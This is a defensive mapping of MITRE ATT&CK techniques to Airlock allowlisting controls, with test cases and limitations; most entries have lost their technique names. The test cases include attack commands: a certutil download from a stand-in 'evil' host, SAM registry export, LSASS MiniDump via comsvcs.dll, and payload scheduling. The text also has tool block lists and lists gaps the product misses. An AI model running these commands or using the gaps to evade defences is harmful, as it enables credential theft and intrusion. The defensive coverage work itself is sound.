enforcement_mechanism: Data obfuscation. Network-level C2 technique. No file execution.
Junk data. Network.
Steganography. Network.
Protocol impersonation. Network.

Untrusted dumping tools (mimikatz, secretsdump) blocked by default-deny. Built-in tools usable for credential dumping (procdump, comsvcs.dll via rundll32, reg.exe for SAM export) can be restricted via blocklist metarules: blocklist procdump by original_filename, restrict rundll32 for non-admins, restrict reg.exe for non-admins. Predefined Microsoft Recommended Block Rules covers many credential tools.
test_case: 1) mimikatz.exe -> blocked (untrusted). 2) Blocklist procdump.exe by original_filename. 3) Blocklist metarule: original_filename 'rundll32' AND user NOT admin -> blocks comsvcs.dll MiniDump for non-admins. 4) Import Microsoft Recommended Block Rules.
limitations: Admin users exempted from metarule can still use these tools. Credential Guard is complementary control for LSASS protection.

enforcement_mechanism: LSASS memory dump tools blocked (mimikatz untrusted, procdump blocklisted). comsvcs.dll MiniDump via rundll32: restrict rundll32 for non-admins via metarule. Task Manager dump requires interactive admin session — outside typical attacker workflow.
test_case: 1) mimikatz -> blocked. 2) Blocklist procdump by original_filename. 3) Metarule: original_filename 'rundll32' AND user NOT admin -> blocks comsvcs.dll abuse. 4) Credential Guard for defense-in-depth.
limitations: Admin-exempted users can still dump. Credential Guard is the definitive LSASS control.

enforcement_mechanism: SAM export via reg.exe: restrict reg.exe for non-admins via blocklist metarule. Standalone SAM tools blocked by default-deny.
test_case: 1) Standalone tool -> blocked. 2) Metarule: original_filename 'reg' AND user NOT admin -> blocks reg save HKLM\SAM.
limitations: Admin-exempted users can still use reg.exe.

enforcement_mechanism: ntdsutil.exe: restrict via blocklist metarule for non-admins. Standalone tools blocked.
test_case: 1) Standalone tool -> blocked. 2) Blocklist ntdsutil.exe for non-admins.
limitations: DC-focused. Admin users on DC need ntdsutil for legitimate operations — scope metarule carefully.

enforcement_mechanism: LSA secrets dump tools blocked. reg.exe restrictable via metarule.
test_case: Same as T1003.002 — restrict reg.exe for non-admins.

enforcement_mechanism: Cached domain credentials. Accessed via trusted tools/APIs.
DCSync. Uses Active Directory replication protocol. No file execution, just network/AD operations.
limitations: If DCSync tool (mimikatz) is untrusted, tool blocked.

enforcement_mechanism: Data from local system. Reading files. Data operation.
limitations: If collection tool is untrusted, blocked.

enforcement_mechanism: Direct volume access. Reads raw disk sectors bypassing file system. Operates inside trusted process using API calls. Airlock doesn't monitor raw disk access.
limitations: If tool performing direct volume access is untrusted, the tool itself is blocked.

enforcement_mechanism: sc.exe (sc query) restrictable via blocklist metarule for non-admins.
limitations: PowerShell Get-Service available if PS trusted.

enforcement_mechanism: Fallback channels. Network.
Application window discovery. API-based enumeration.
Exfiltration over other network medium. Network-level data transfer.
limitations: If exfil tool untrusted, blocked.

enforcement_mechanism: Exfiltration over Bluetooth. Network/hardware.
reg.exe restrictable via blocklist metarule for non-admins.
test_case: Blocklist reg.exe for non-admins -> prevents reg query.
limitations: PowerShell Get-ItemProperty available if PS trusted.

enforcement_mechanism: Rootkit as a driver must be trusted to load. Airlock kernel driver intercepts driver loads. MS Recommended Driver Block Rules predefined blocklist covers known malicious drivers.
test_case: Untrusted rootkit driver -> blocked at load. Import MS Driver Block Rules for known bad drivers.
limitations: Post-load kernel manipulation not caught. Rootkits already in memory are EDR/Secure Boot territory.

enforcement_mechanism: ipconfig.exe, route.exe, arp.exe restrictable via blocklist metarule for non-admins.
test_case: Blocklist ipconfig.exe, route.exe, arp.exe for non-admins.
limitations: PowerShell networking cmdlets available if PS trusted. These are aggressive blocks — evaluate operational impact.

enforcement_mechanism: Internet connection discovery. Testing connectivity. Trusted tools.
netsh.exe (netsh wlan show) restrictable via blocklist metarule.
net.exe (net view) restrictable via blocklist metarule. Standalone scanning tools blocked.
test_case: 1) Standalone scanner -> blocked. 2) Blocklist net.exe for non-admins.
limitations: ping, nslookup too fundamental to blocklist. net.exe is the primary discovery tool to restrict.

enforcement_mechanism: Automated exfiltration. Scripted data transfer. Script must be trusted.
limitations: Trusted PS scripts doing data transfer succeed.

enforcement_mechanism: Remote access to target. Post-access, any untrusted tools attacker tries to run are blocked by Airlock on the target endpoint.
test_case: Attacker RDPs/SSHs to target, runs unsigned tool -> blocked.
limitations: Access mechanism itself not prevented. Airlock's value is enforcement on the target.

enforcement_mechanism: RDP provides access. Post-access, any untrusted tool attacker runs is blocked by Airlock on target.
test_case: RDP to target -> attempt to run unsigned tool -> blocked.
limitations: RDP access itself not prevented. Airlock's value is execution control post-access.

enforcement_mechanism: SMB/Windows admin shares. Tools like PsExec push service binaries via SMB. Binary must be trusted on target. PsExec blocklisted.
test_case: PsExec via SMB -> PSEXESVC.exe blocked on target. Attacker copies malware via \\target\C$ -> execution blocked.
limitations: File copy succeeds. Execution blocked.

enforcement_mechanism: DCOM. Remote COM execution. Payload on remote host must be trusted. DLLs must be trusted.
test_case: DCOM executing untrusted payload on remote host -> blocked.
limitations: DCOM using trusted binaries succeeds.

enforcement_mechanism: VNC server must be allowlisted on target to run. Unauthorized VNC installation blocked.
test_case: VNC server exe not allowlisted -> blocked.
limitations: If VNC is legitimately deployed and trusted, attacker with credentials has access.

enforcement_mechanism: WinRM commands execute on remote target. Any binary/script the command invokes must be trusted on target.
test_case: WinRM executing untrusted binary on target -> blocked.
limitations: Inline PS commands via WinRM on trusted PS succeed. Execution of untrusted files is blocked.

enforcement_mechanism: Data from removable media. Reading USB. Data operation.
Obfuscation changes file hash. Obfuscated variant has unknown hash -> not in allowlist -> blocked by default-deny. This is a fundamental strength of allowlisting over signature-based detection.
test_case: Obfuscated exe with unique hash -> blocked (not in allowlist).
limitations: If obfuscated file retains valid publisher signature, may pass publisher trust.

enforcement_mechanism: Binary padding. Changes hash. Padded binary won't match allowlisted hash.
test_case: Padded exe -> new hash -> not in allowlist -> blocked.
limitations: Publisher trust still applies if signature valid.

enforcement_mechanism: Software packing. Packed exe has different hash than original. Not in allowlist.
limitations: If packer preserves valid publisher signature, may pass publisher trust. Rare in practice.

enforcement_mechanism: Steganography. Data hidden in images. No file execution until payload extracted.
test_case: Stego payload extracted and executed -> blocked if untrusted.
limitations: Extraction happens inside trusted process.

enforcement_mechanism: Source code delivered, compiled on target. Compiled output has new hash -> blocked by default-deny. Compilers (csc.exe, vbc.exe) are MS-signed but can be explicitly blocklisted to prevent compilation entirely.
test_case: 1) Compile .cs with csc.exe -> output exe blocked (untrusted hash). 2) Blocklist csc.exe/vbc.exe for non-developers.
limitations: Compilers are MS-signed and may be publisher-trusted. Without explicit blocklist, compilation can occur but output is still blocked.

enforcement_mechanism: Modified tool has new hash -> not in allowlist -> blocked.
HTML smuggling. Malicious file assembled from HTML/JS in browser. When user saves and executes, file must be trusted.
test_case: HTML smuggling assembles exe in browser -> user saves to disk -> runs -> blocked.
limitations: Assembly happens in browser JS. Execution blocked.

enforcement_mechanism: Dynamic API resolution. Runtime technique inside trusted process. No file execution.
limitations: In-process behavior.

enforcement_mechanism: Stripped payload has new hash -> not in allowlist -> blocked.
Embedded payload extracted and executed. Extracted payload must be trusted.
test_case: Extracted payload executed -> blocked if untrusted.
limitations: Extraction happens inside trusted process — not caught. Execution of extracted file IS caught.

enforcement_mechanism: Command obfuscation. Obfuscated commands in trusted interpreter. Airlock doesn't inspect command content.
limitations: Inline commands in trusted interpreter not inspected regardless of obfuscation.

enforcement_mechanism: Fileless storage. Malicious content stored in registry/WMI/etc. No file on disk to hash.
limitations: If fileless payload eventually loads DLL/exe, that load is checked.

enforcement_mechanism: LNK triggering payload execution. Payload must be trusted.
limitations: LNK file itself not controlled.

enforcement_mechanism: Encrypted/encoded file must be decrypted before execution. Decrypted payload must be trusted.
test_case: Encrypted payload decrypted to disk, executed -> blocked.
limitations: Decryption inside trusted process not caught. Execution of decrypted file IS caught.

enforcement_mechanism: Polymorphic code generates unique hash each time -> never matches allowlist. Default-deny is inherently anti-polymorphic. This is a strong advantage over signature-based detection.
test_case: Polymorphic exe -> unique hash every time -> blocked every time.
limitations: Fundamental strength of allowlisting vs AV signatures.

enforcement_mechanism: Compressed payload extracted and executed -> must be trusted.
Junk code changes hash -> not in allowlist -> blocked.
SVG smuggling. Similar to HTML smuggling. Assembled file must be trusted to execute.
test_case: SVG smuggling assembles payload -> user executes -> blocked.
limitations: Assembly in browser.

enforcement_mechanism: Scheduled transfer. Same principle.
Data transfer size limits. Network-level evasion.
whoami.exe restrictable via blocklist metarule for non-admins.
limitations: Environment variables and PowerShell alternatives available if PS trusted.

enforcement_mechanism: Masquerading changes file appearance but not file hash. Airlock checks SHA-256 hash of actual file content — masquerading is irrelevant to enforcement.
test_case: Renamed malware -> hash doesn't match allowlist -> blocked. Blocklist original_filename metarule catches renamed trusted tools.

enforcement_mechanism: Invalid code signature. File with invalid/spoofed signature. Airlock verifies publisher signatures cryptographically. Invalid sig = untrusted.
test_case: Exe with invalid signature -> not trusted by publisher -> blocked unless hash-trusted.
limitations: Airlock's publisher trust verifies signatures properly.

enforcement_mechanism: Right-to-left override. Disguises file extension. Airlock hashes the actual file regardless of display name.
test_case: RLO-renamed exe -> still hashed as exe -> blocked if untrusted.
limitations: Hash check is name-agnostic.

enforcement_mechanism: Rename legitimate utilities. Renamed tool still has same hash. BUT blocklist metadata engine uses original_filename field which survives renaming. Can blocklist by original_filename regardless of actual filename.
test_case: Rename powershell.exe to svchost.exe -> blocklist metarule on original_filename 'powershell' still catches it.
limitations: Original filename is embedded in PE metadata. This is a strong detection.

enforcement_mechanism: Masquerade task or service name. Naming trick. Doesn't affect file trust.
limitations: Service binary still checked regardless of service name.

technique_name: Match Legitimate Resource Name or Location
enforcement_mechanism: Match legitimate resource name/location. Malicious file in legitimate-looking path. Hash check catches regardless of location.
limitations: If directory is path-trusted, could be a gap. Don't path-trust System32 broadly.

enforcement_mechanism: Double file extension. document.pdf.exe displayed as PDF. Airlock checks actual file type and hashes.
test_case: Double extension exe -> hashed as PE -> blocked.

enforcement_mechanism: Masquerade file type. File with wrong extension. Airlock hashes the full file content.
test_case: Exe with .txt extension -> when executed, still hashed as PE -> blocked if untrusted.

enforcement_mechanism: Masquerade account name. Identity-level disguise.
Browser fingerprint manipulation. Browser behavior, no file execution.
Boot/logon init scripts. Script content must be trusted via script control. Untrusted scripts blocked at logon.
test_case: Set GPO logon script to untrusted .bat -> blocked at logon.
limitations: Script path configuration not prevented.

enforcement_mechanism: Logon scripts (Windows). Script file must be trusted. Scripts in NETLOGON share: if path-trusted, runs.
test_case: Place untrusted .bat in NETLOGON, assign via GPO -> blocked on target at logon.
limitations: Legitimate scripts in trusted paths run. Replacing trusted script at same path could work if path-trusted.

enforcement_mechanism: Network logon script. Same principle as T1037.001 but via network logon.
limitations: Same path trust caveats.

enforcement_mechanism: Data from network shared drive. Reading shares. Data operation.
Standalone capture tools (Wireshark, tcpdump, windump) blocked by default-deny. Built-in pktmon.exe restrictable via blocklist metarule.
test_case: 1) Wireshark not allowlisted -> blocked. 2) Blocklist pktmon.exe for non-admins.
limitations: Network-level captures via other means (port mirroring) outside scope.

enforcement_mechanism: Exfiltration over C2 channel. Network. In-process by C2 implant.
limitations: If C2 implant is untrusted, blocked. Network-level exfil not caught.

enforcement_mechanism: Standalone scanning tools (nmap, masscan) blocked by default-deny. PowerShell Test-NetConnection available but PS itself can be blocklisted for non-admins.
test_case: 1) nmap -> blocked. 2) Blocklist PS for non-admins to prevent Test-NetConnection scanning.
limitations: Basic network tools (ping, nslookup) hard to blocklist without breaking operations.

enforcement_mechanism: WMI tools (wmic.exe, wmiprvse.exe) typically trusted. Any payload WMI launches must pass default-deny — untrusted exe/script/DLL blocked at execution. wmic.exe itself can be blocklisted per user/group via metarules.
test_case: wmic process call create C:\Temp\unsigned.exe -> exe blocked at execution. Blocklist wmic.exe for non-admins via metarule.
limitations: Inline WMI commands (process call create 'cmd /c whoami') run inside trusted interpreter — not inspected. WMI event subscriptions: payload still checked at execution.

enforcement_mechanism: Exfiltration over alternative protocol. Network.

technique_name: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
enforcement_mechanism: Symmetric encrypted non-C2. Network.

technique_name: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
enforcement_mechanism: Asymmetric encrypted non-C2. Network.
Unencrypted non-C2. Network.
netstat.exe restrictable via blocklist metarule for non-admins.
limitations: PowerShell Get-NetTCPConnection available if PS trusted.

enforcement_mechanism: Exfiltration over physical medium. USB/physical.
Exfiltration over USB. Physical.
Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted.
test_case: schtasks /create /tn test /tr C:\Temp\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked.
limitations: Task creation succeeds. Trusted-signed payloads run.

enforcement_mechanism: at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time.
test_case: at 12:00 C:\Temp\malware.exe -> job creates, exe blocked at scheduled time.
limitations: Job creation not prevented.

enforcement_mechanism: Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules.
test_case: schtasks /create /tn evil /tr C:\Temp\payload.exe -> OK. On fire, payload blocked.
limitations: Task creation not prevented. PS one-liners via -Command not caught if PS trusted.

enforcement_mechanism: Process injection (parent). Injecting code into trusted process memory. Airlock doesn't monitor memory operations. If injection requires loading a DLL from disk, DLL control catches it.
test_case: DLL injection where DLL is a file on disk -> DLL must be trusted. Memory-only injection -> not caught.
limitations: Primary gap. EDR territory for memory-based injection.

enforcement_mechanism: DLL injection via LoadLibrary — DLL file must exist on disk and be trusted. Airlock blocks untrusted DLL at load time.
test_case: CreateRemoteThread + LoadLibrary with untrusted DLL -> DLL blocked at load.
limitations: Reflective DLL injection (loaded entirely from memory, no file on disk) not caught — that's EDR territory.

enforcement_mechanism: PE injection. Writing PE directly into process memory. No file on disk.
limitations: EDR territory.

enforcement_mechanism: Thread execution hijacking. Modifying existing thread in trusted process. Memory-level.
Asynchronous procedure call (APC) injection. Memory-level.
Thread local storage injection. Memory-level.
Extra window memory injection. Memory-level.

Process hollowing creates a suspended process with a trusted binary, then replaces its image in memory. The memory replacement is invisible to Airlock. The initial process uses a trusted binary so Airlock allows it.
test_case: N/A — memory manipulation of trusted process.
limitations: If hollowing stages payload as file on disk first, that file is checked. Pure memory hollowing not caught. EDR territory.

enforcement_mechanism: Process doppelganging uses NTFS transactions to create a file, load it into memory, then roll back the transaction. The file never persists on disk. Airlock's kernel driver may or may not intercept the transacted file load — needs lab validation.
test_case: Needs lab testing to confirm whether Airlock's kernel driver intercepts file loads during NTFS transactions.
limitations: Uncertain coverage. Treat as not covered until validated.

enforcement_mechanism: ListPlanting. Message-based code execution in trusted process. Memory-level.
Keylogger as standalone tool blocked. DLL-based keylogger DLL blocked. But keylogging achievable via trusted process API hooks or in-process techniques.
test_case: Standalone keylogger exe -> blocked. Keylogger DLL -> blocked.
limitations: In-process keylogging via trusted process not caught. EDR territory.

enforcement_mechanism: Standalone keylogger tools/DLLs blocked. But technique achievable with in-process hooks from trusted code.
test_case: Keylogger exe -> blocked. Keylogger DLL -> blocked.
limitations: In-process API-level keylogging not caught.

enforcement_mechanism: GUI input capture. Fake dialog boxes from trusted processes. In-process.
Web portal capture. Server-side/web-level.
Credential API hooking DLL must be trusted to load. But hooking achievable from within trusted process.
limitations: In-process hooking not caught.

enforcement_mechanism: tasklist.exe restrictable via blocklist metarule for non-admins.
limitations: PowerShell Get-Process available if PS trusted.

enforcement_mechanism: Script control enforces allowlisting on all configured script types (PS, batch, cmd, Python, JS, VBS, MSI, etc). Every script SHA-256 hashed at execution. Interpreters controllable via allowlist/blocklist metarules. DLL control catches malicious modules loaded by interpreters.
test_case: Drop untrusted .ps1/.bat/.vbs/.py, execute -> blocked. Blocklist PS for non-admins via metarule (original filename contains powershell AND user not admin).
limitations: Interactive/inline commands in trusted interpreter not intercepted. Script control must be enabled.

enforcement_mechanism: Script control blocks untrusted .ps1/.psm1/.psd1. powershell.exe blocklisted for non-admins via metarule (explicitly demonstrated in Airlock blocklist docs). PS -EncodedCommand/-Command inline not inspected.
test_case: 1) Drop unsigned .ps1, invoke -> blocked. 2) Metarule: original_filename contains 'powershell' AND user NOT admin -> PS blocked for std users. 3) PS -Command 'whoami' -> runs if PS trusted. 4) PS -EncodedCommand <b64> -> runs if PS trusted.
limitations: Inline/encoded commands in trusted PS not caught. AMSI bypass, download cradles in-memory not Airlock scope.

enforcement_mechanism: Batch/cmd files (.bat/.cmd) enforced under script control. cmd.exe blocklist-restrictable. Child processes spawned by cmd still checked.
test_case: 1) Drop .bat, execute -> blocked. 2) cmd /c dir -> runs (inline). 3) cmd /c C:\Temp\malware.exe -> cmd OK, malware.exe blocked. 4) Blocklist cmd for non-admins.
limitations: Inline commands not inspected. Child process launches ARE checked.

enforcement_mechanism: VBScript (.vbs/.vbe) blocked via script control. cscript/wscript/mshta blocklist-controllable. VBA macros inside Office: doc opens (Office trusted), dropped payloads blocked.
test_case: 1) .vbs double-click -> blocked. 2) Blocklist wscript/cscript entirely. 3) Macro drops exe -> exe blocked.
limitations: VBA macro code inside trusted Office not inspected.

enforcement_mechanism: python.exe must be allowlisted. .py files enforced via script control. .pyd as DLL control. Most endpoints don't need Python.
test_case: 1) python.exe not allowlisted -> blocked. 2) Trusted python.exe, untrusted .py -> blocked. 3) python -c 'print(1)' -> runs if trusted (inline).
limitations: Interactive REPL/inline not inspected.

enforcement_mechanism: JS files (.js/.jse) via WSH blocked by script control. node.exe must be allowlisted. mshta.exe blocklist-controllable. Browser JS not in scope.
test_case: 1) .js double-click -> blocked. 2) Blocklist mshta.exe. 3) node.exe not allowlisted -> blocked.
limitations: Browser JS runs inside trusted browser process.

enforcement_mechanism: AutoHotKey/AutoIT interpreters must be allowlisted (typically not in enterprise). Compiled AHK/AutoIT .exe caught by default-deny.
test_case: 1) AutoIt3.exe not allowlisted -> blocked. 2) Compiled AutoIT dropper -> blocked.
limitations: If interpreter is allowlisted, scripts need coverage.

enforcement_mechanism: lua.exe/luajit must be allowlisted. Not present in typical enterprise. Embedded Lua in trusted apps not in scope.
limitations: Embedded Lua in trusted processes runs in-process.

enforcement_mechanism: Exploitation for privilege escalation. Exploit runs inside trusted process. If exploit drops payload, blocked. If exploit is a standalone tool, must be trusted.
test_case: Attacker drops exploit.exe -> blocked. Exploit inside trusted process dropping payload -> payload blocked.
limitations: In-memory exploitation not caught. Kernel exploits operating below Airlock not caught.

enforcement_mechanism: net.exe (net group, net localgroup) restrictable via blocklist metarule.
limitations: PowerShell AD cmdlets available if PS trusted.

enforcement_mechanism: net localgroup via net.exe. Restrictable.
net group /domain via net.exe. Restrictable.
Indicator removal (parent). Deleting logs, files, etc. Data operations using trusted tools.
wevtutil.exe: restrict via blocklist metarule for non-admins. Prevents attacker from clearing event logs to cover tracks.
test_case: Metarule: original_filename 'wevtutil' AND user NOT admin -> blocks log clearing.
limitations: Admin-exempted users can still clear logs. Also clearable via PS (Clear-EventLog) if PS is trusted.

enforcement_mechanism: Clear command history. Data operation in trusted process.
File deletion. del/rm via trusted shell. Data operation.
net.exe used for 'net use /delete'. Restrictable via blocklist metarule.
limitations: Minor technique. PowerShell Remove-SmbMapping available if PS trusted.

enforcement_mechanism: Timestomp. Modifying file timestamps. Data operation.
limitations: Airlock hashes file content, not timestamps.

technique_name: Clear Network Connection History and Configurations
enforcement_mechanism: Clear network connection history. Data operation.
Clear mailbox data. Data operation.
Clear persistence. Removing previously set persistence. Data operation.
Relocating malware to a different directory. File still has untrusted hash -> blocked regardless of location.
test_case: Relocated malware still blocked by hash check.
limitations: Actually covered by default-deny (hash doesn't change with location) but the technique itself is about evasion, and Airlock doesn't prevent file movement.

enforcement_mechanism: Application layer protocol. Network.
Web protocols. Network.
File transfer protocols. Network.
Mail protocols. Network.
DNS. Network.
Publish/subscribe protocols. Network.

Deployment tools (SCCM, PDQ) are trusted. If compromised to push malicious payloads, payload must still pass default-deny on target endpoint. Untrusted binary blocked at execution regardless of delivery method.
test_case: Push unsigned exe via SCCM to endpoint -> deployed successfully, blocked at execution.
limitations: If deployment tool configured as trusted parent process, audit process trust rules carefully. Payloads signed by trusted publisher pass publisher trust.

enforcement_mechanism: Data staged. Collecting data to staging location. Data operation.
Local data staging. Same.
Remote data staging. Same.
Valid accounts. Using legitimate credentials. Identity plane. No file execution.
limitations: Post-access, Airlock enforces on tools attacker runs with valid creds.

enforcement_mechanism: Default accounts. Identity.
Domain accounts. Identity.
Local accounts. Identity.
Taint shared content. Placing malicious files on network shares. When victim executes file, Airlock blocks untrusted payload.
test_case: Malicious exe on share -> victim double-clicks -> blocked.
limitations: File placement not prevented. Execution on victim blocked.

enforcement_mechanism: systeminfo.exe restrictable via blocklist metarule for non-admins.
limitations: WMI queries (via trusted wmic or PS) can retrieve same info if not blocklisted.

enforcement_mechanism: File and directory discovery. dir, Get-ChildItem. Trusted.
net.exe (net user) restrictable via blocklist metarule.
limitations: PowerShell alternatives if PS trusted.

enforcement_mechanism: net user via net.exe. Restrictable.
net user /domain via net.exe. Restrictable.
Email account discovery. Trusted tools/APIs.
Proxy. Network infrastructure.
Internal proxy tools (chisel, socat, netsh portproxy) — standalone tools blocked. netsh restrictable via blocklist metarule.
test_case: 1) chisel/socat -> blocked (untrusted). 2) Blocklist netsh for non-admins.
limitations: netsh portproxy is the built-in risk. Blocklist addresses it.

enforcement_mechanism: External proxy. Network.
Multi-hop proxy. Network.
Domain fronting. Network.
Replication through removable media. Malware on USB must be trusted to execute. Autorun payloads blocked.
test_case: Insert USB with unsigned exe, attempt to run -> blocked. Autorun pointing to untrusted payload -> blocked.
limitations: USB device insertion not prevented. Only execution of untrusted files.

enforcement_mechanism: Communication through removable media. Data on USB for C2. No execution required.
limitations: If C2 agent on USB is untrusted, blocked.

enforcement_mechanism: Non-application layer protocol. Network.
Account manipulation. Identity-plane operation. No file execution.
limitations: Identity/directory security.

enforcement_mechanism: Additional email delegate permissions. No file execution.
Device registration. MDM/identity plane.
net.exe used for group manipulation. Restrictable via blocklist metarule for non-admins.
test_case: Metarule: original_filename 'net' AND user NOT admin -> blocks net group/localgroup manipulation.
limitations: PowerShell AD cmdlets still available if PS is trusted for the user.

enforcement_mechanism: Web service. Network.
Dead drop resolver. Network.
Bidirectional communication. Network.
One-way communication. Network.
Multi-stage channels. Network.
limitations: If staged payload is file, must be trusted.

enforcement_mechanism: Ingress tool transfer — downloaded tools must be trusted to execute. Download succeeds but execution blocked. Download utilities (certutil, bitsadmin, curl) can be blocklisted.
test_case: 1) certutil -urlcache -split -f http://evil/tool.exe C:\Temp\t.exe -> downloads, execution blocked. 2) Blocklist certutil/bitsadmin for non-admins.
limitations: Download not prevented. Execution is the control point.

enforcement_mechanism: Native API calls (NtCreateProcess, VirtualAllocEx, CreateRemoteThread) operate inside trusted processes. Airlock doesn't hook APIs. If API call loads new DLL/exe, that IS checked.
test_case: N/A - API-level behavior inside trusted processes.
limitations: By design. EDR territory.

enforcement_mechanism: Brute force. Network-based credential attacks. No file execution on target.
limitations: If brute force tool is untrusted, tool blocked.

enforcement_mechanism: Password guessing. Network-level.
Password cracking tools (hashcat, john) must be trusted. Blocked by default-deny.
limitations: Typically offline attack. Tools must be on the endpoint to be relevant.

enforcement_mechanism: Password spraying. Network-level.
Credential stuffing. Network-level.
MFA interception. Identity/protocol level.
reg.exe and regedit.exe: restrict via blocklist metarule for non-admins. Many persistence techniques rely on registry modification — blocking reg.exe reduces attack surface.
test_case: Metarule: original_filename 'reg' AND user NOT admin -> blocks reg.exe. Metarule: original_filename 'regedit' AND user NOT admin -> blocks regedit.
limitations: PowerShell Set-ItemProperty still available if PS trusted. Registry APIs from trusted processes not caught.

enforcement_mechanism: Standalone screenshot tool blocked. Built-in Snipping Tool/PowerShell trusted.
limitations: Built-in tools succeed.

enforcement_mechanism: Email collection. Reading emails. Data operation.
Local email collection. Data operation.
Remote email collection. Network/API operation.
Email forwarding rule. Config operation.
Clipboard data. API-based access from trusted process.
Automated collection scripts must be trusted. But technique achievable with trusted PowerShell scripts.
limitations: Trusted PS scripts succeed.

enforcement_mechanism: Peripheral device discovery. Trusted tools/APIs.
Standalone audio capture tool blocked. Trusted tools/APIs succeed.
System time discovery. w32tm, time. Trusted.
Standalone video capture tool blocked. Trusted tools/APIs succeed.
Trusted developer utilities proxy execution (parent). Tools like MSBuild used to execute code. These LOLBINs can be blocklisted. Payloads they load must be trusted.
test_case: Blocklist MSBuild, InstallUtil, etc. Payload DLLs loaded by these tools must be trusted.
limitations: Core LOLBIN defense. Blocklist + DLL control is strong.

enforcement_mechanism: MSBuild. Can compile and execute code from XML project files. MSBuild.exe can be blocklisted. Output binaries/DLLs must be trusted.
test_case: 1) Blocklist msbuild.exe for non-developers. 2) MSBuild output exe -> blocked (untrusted). 3) MSBuild loading untrusted DLL -> blocked.
limitations: If MSBuild is allowlisted, it can compile code. Blocklist is key.

enforcement_mechanism: ClickOnce. Application deployment via .application files. Downloaded assemblies must be trusted.
limitations: ClickOnce deployment mechanism itself uses trusted dfsvc.exe.

enforcement_mechanism: JamPlus. Build tool. Can execute arbitrary code. Must be allowlisted to run.
limitations: Niche tool. Unlikely to be in enterprise allowlist.

enforcement_mechanism: Airlock allowlists DLLs by default. Every DLL load SHA-256 hashed and checked. Prevents DLL sideloading.
test_case: 1) Place unsigned DLL in trusted app directory (sideload) -> blocked. 2) LoadLibrary('C:\Temp\evil.dll') -> blocked.
limitations: Reflective DLL injection (memory-only, never a file) not caught.

enforcement_mechanism: Data encoding. Network-level.
Standard encoding. Network.
Non-standard encoding. Network.
External remote services (VPN/RDP/Citrix). Access mechanism. Post-access, Airlock enforces on any tools attacker tries to run.
test_case: RDP in, attempt unsigned tool -> blocked.
limitations: Access itself not prevented.

enforcement_mechanism: Access token manipulation. API-level operations inside trusted process. No file execution.
limitations: If tool for token manipulation is untrusted, tool itself blocked.

enforcement_mechanism: Token impersonation/theft. API-level.
Process created with stolen token — the process binary must be trusted, but token manipulation itself is API-level and not caught.
limitations: Token manipulation is identity/API level. EDR territory.

enforcement_mechanism: Make and impersonate token. API-level.
Parent PID spoofing is API-level process creation. Binary must be trusted but spoofing is not detected.
limitations: May affect Airlock process trust rules that key on parent process. Test.

enforcement_mechanism: SID-History injection. Identity/AD manipulation.
net.exe (net share, net view) restrictable via blocklist metarule.
limitations: PowerShell Get-SmbShare available if PS trusted.

enforcement_mechanism: net.exe (net user /add) restrictable via blocklist metarule for non-admins.
test_case: Blocklist net.exe for non-admins -> prevents net user /add.
limitations: PowerShell New-LocalUser/New-ADUser available if PS trusted.

enforcement_mechanism: net.exe used for account creation. Restrictable via blocklist metarule.
test_case: Metarule: original_filename 'net' AND user NOT admin -> blocks net user /add.
limitations: PowerShell New-LocalUser available if PS trusted.

enforcement_mechanism: Domain account. Identity operation.
Office application startup. Malicious add-ins (DLLs) must be trusted. Template macros: doc opens, payload blocked.
test_case: 1) Untrusted Office add-in DLL -> blocked at Office startup. 2) Malicious .dotm macro drops exe -> exe blocked.
limitations: Macro code inside trusted Office not inspected.

enforcement_mechanism: Office template macros. Template loads in trusted Office. Macro code runs. Dropped payloads blocked.
test_case: Malicious .dotm macro drops exe -> exe blocked.
limitations: Macro code itself runs inside Office.

enforcement_mechanism: Office Test reg key loads DLL into Office. DLL must be trusted.
test_case: Set Office Test reg key to unsigned DLL -> DLL blocked at Office launch.
limitations: Reg mod not prevented.

enforcement_mechanism: Outlook forms loading DLLs — DLL must be trusted.
test_case: Outlook form loading untrusted DLL -> blocked.
limitations: VBScript running inside trusted Outlook form context may execute. Dropped payloads blocked.

enforcement_mechanism: Outlook home page triggering external process execution — process must be trusted.
test_case: Outlook home page launching untrusted exe -> blocked.
limitations: HTML/script running inside Outlook's embedded browser context may not be caught.

enforcement_mechanism: Outlook rules can run applications. Application must be trusted.
test_case: Outlook rule to run C:\Temp\payload.exe -> blocked.
limitations: Rule creation not prevented.

enforcement_mechanism: Office add-ins (.dll/.xll). Must be trusted by hash/publisher.
test_case: Untrusted .xll in add-in dir -> blocked by Excel.
limitations: Signed add-ins from trusted publishers load normally.

enforcement_mechanism: Decoded/deobfuscated payload must be trusted to execute. certutil.exe (commonly used for decoding) can be blocklisted.
test_case: 1) certutil -decode output.exe -> output.exe blocked. 2) Blocklist certutil for non-admins.
limitations: Decoding itself not prevented if tool is trusted. Decoded file execution IS blocked.

enforcement_mechanism: Browser extensions. Dedicated browser extension control feature. Untrusted extensions blocked from installation on Chrome/Edge/Firefox. Extension updates monitored.
test_case: 1) Enable browser ext control in enforcement. 2) Install untrusted extension -> fails. 3) Untrusted extension update -> browser uninstalls it.
limitations: Only controls extension installation, not JS within trusted extensions.

enforcement_mechanism: Browser extensions specifically. Same as parent.
limitations: Same.

enforcement_mechanism: IDE must be allowlisted. IDE extension DLLs/native modules must be trusted.
test_case: Untrusted VS Code extension native module -> blocked at load.
limitations: JS-based extensions run inside trusted IDE process — not separately controlled.

enforcement_mechanism: Browser session hijacking. In-browser or extension-based. Malicious extension install blocked by browser extension control, but technique achievable via trusted extensions or in-page JS.
limitations: In-browser techniques not caught.

enforcement_mechanism: Forced authentication. Triggering NTLM auth via UNC paths. No file execution.
Drive-by compromise — browser exploit in trusted browser. Any payload dropped to disk (exe/DLL/script) must be trusted.
test_case: Drive-by drops exe -> blocked. Drive-by drops DLL -> blocked.
limitations: In-browser exploitation executing entirely in memory not caught.

enforcement_mechanism: Exploiting a public-facing application is a network/application security problem. Airlock doesn't prevent exploits. WAF, patching, network segmentation are the controls. Post-exploitation payload execution on the host is covered under execution techniques.
limitations: Web application firewalls, patching, and network segmentation are the primary controls.

enforcement_mechanism: Supply chain compromise with valid publisher signatures. If compromised software is signed by a publisher trusted in Airlock policy, it passes. Unsigned/differently-signed supply chain payloads blocked.
